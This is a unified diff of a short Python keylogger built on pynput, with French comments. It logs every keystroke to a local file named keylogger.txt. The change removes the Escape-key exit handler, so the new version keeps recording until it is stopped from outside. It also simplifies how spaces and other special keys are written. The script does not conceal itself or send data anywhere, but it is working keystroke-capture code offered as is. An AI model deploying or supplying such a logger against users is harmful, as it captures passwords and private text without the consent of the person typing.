@@ -1,29 +1,19 @@
 from pynput import keyboard
 
-def pression(key):
-    """enregistre la touche pressee dans le fichier"""
+def onPush(key):
+    """
+    enregistre dans un fichier texte les touches frappes
+    """
 
     try:
         with open("keylogger.txt","a") as f:
-            f.write(key.char)
+            f.write(f"{key.char}")
     except AttributeError:
         if key == keyboard.Key.space:
             with open("keylogger.txt","a") as f:
-                f.write("keyboard.Key.space")
-        else:
-            with open("keylogger.txt","a") as f:
-                f.write("key")
-def relachement(key):
-    """sort du programme avec une touche speciale"""
+                f.write(" ")
 
-    if key == keyboard.Key.esc:
-        return False
 
 if __name__ == "__main__":
-    with keyboard.Listener(on_press=pression,on_release=relachement) as l:
-        l.join()
-
-
-
-
-
+    with keyboard.Listener(on_press=onPush) as listener:
+        listener.join()
